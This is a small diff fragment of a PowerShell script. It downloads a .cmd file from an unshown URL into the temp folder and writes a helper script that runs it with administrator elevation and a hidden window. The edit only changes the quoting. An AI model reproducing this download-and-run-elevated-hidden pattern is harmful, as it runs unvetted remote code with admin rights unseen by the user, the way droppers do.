@@ -6,7 +6,7 @@ $tempPath = "$env:TEMP\test.cmd"
 Invoke-WebRequest -Uri $cmdUrl -OutFile $tempPath
 
 $scriptContent = @"
-Start-Process -FilePath 'cmd.exe' -ArgumentList '/c `"start $tempPath`"' -Verb RunAs -WindowStyle Hidden
+Start-Process -FilePath 'cmd.exe' -ArgumentList '/c "$tempPath"' -Verb RunAs -WindowStyle Hidden
 "@
 
 $psScriptPath = "$env:TEMP\RunAsAdmin.ps1"
